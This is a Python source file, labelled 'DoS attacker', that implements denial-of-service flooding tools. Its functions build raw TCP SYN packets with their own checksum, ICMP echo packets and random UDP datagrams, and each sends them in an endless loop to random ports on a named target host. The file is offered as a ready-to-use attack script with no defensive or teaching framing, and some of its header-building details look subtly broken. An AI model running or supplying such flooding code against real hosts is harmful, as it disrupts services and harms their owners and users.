# DoS attacker.
import os
import socket
import struct
import time
import random
import termcolor


def checksum_calculator(header, size):

    checksum = 0
    pointer = 0

    # The main loop adds up each set of 2 bytes. They are first converted to strings and then concatenated
    # together, converted to integers, and then added to the sum.
    while size > 1:
        checksum += int((str("%02x" % (header[pointer],)) +
                         str("%02x" % (header[pointer+1],))), 16)
        size -= 2
        pointer += 2
    if size:  # This accounts for a situation where the header is odd
        checksum += header[pointer]

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum += (checksum >> 16)

    return (~checksum) & 0xFFFF


def syn_flood(host, time_frame=0.1):

    try:

        # Create a raw socket.
        server = socket.socket(
            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

        # Source IP and desination IP.
        src_ip = socket.gethostbyname(socket.gethostname())
        dst_ip = socket.gethostbyname(host)
        count = 1

        while True:

            # Let's create TCP header.
            src_port = random.randint(1, 1000)
            dst_port = random.randint(1, 1000)
            seq = 0
            ack_numb = 0
            doff = 80
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_len = 20

            # TCP flags.
            fin = 0
            syn = 1
            rst = 0
            psh = 0
            ack = 0
            urg = 0

            window = socket.htons(5840)
            checksum = 0
            urg_ptr = 0

            tcp_flags = fin + (syn << 1) + (rst << 2) + \
                (psh << 3) + (ack << 4) + (urg << 5)

            tcp_header = struct.pack('!4s4sBBHHHLLBBHHH', socket.inet_aton(src_ip), socket.inet_aton(
                dst_ip), placeholder, protocol, tcp_len, src_port, dst_port, seq, ack_numb, doff, tcp_flags, window, checksum, urg_ptr)

            # For calculate real checksum value.
            tcp_checksum = checksum_calculator(tcp_header, len(tcp_header))

            packet = struct.pack('!HHLLBBHHH', src_port, dst_port, seq,
                                 ack_numb, doff, tcp_flags, window, tcp_checksum, urg_ptr)

            server.sendto(packet, (dst_ip, dst_port))
            print(termcolor.colored(f'\n{count} packet sent.', 'blue'))
            count += 1
            time.sleep(time_frame)

    except OSError:

        print(termcolor.colored(
            '\nYour system is not support for RAW sockets!', 'red'))


def icmp_flood(host):

    # Create a raw socket.
    server = socket.socket(
        socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    host = socket.gethostbyname(host)

    # Let's make ICMP header.
    count = 1
    type = 8
    code = 0
    checksum = 0
    id = 1024
    seq = 1

    icmp_header = struct.pack('!BBHHH', type, code, checksum, id, seq)

    # Get the real value of icmp packet checksum.
    icmp_checksum = checksum_calculator(struct.pack(
        '!BBHHH', type, code, checksum, id, seq), len(icmp_header))

    packet = struct.pack('!BBHHH', type, code, icmp_checksum, id, seq)

    # Let's make a flood of ICMP packets.
    while True:

        port = random.randint(1, 1000)

        print(termcolor.colored(f'\n{count} packet sent.', 'blue'))
        server.sendto(packet, (host, port))
        count += 1


def udp_flood(host):

    # Create a socket.
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    host = socket.gethostbyname(host)

    # Generate random byte string.
    data = os.urandom(1024)

    count = 1

    # Let's make it more intresting.
    while True:

        port = random.randint(1, 1000)
        server.sendto(data, (host, port))
        print(termcolor.colored(f'\n{count} packet sent.', 'blue'))
        count += 1
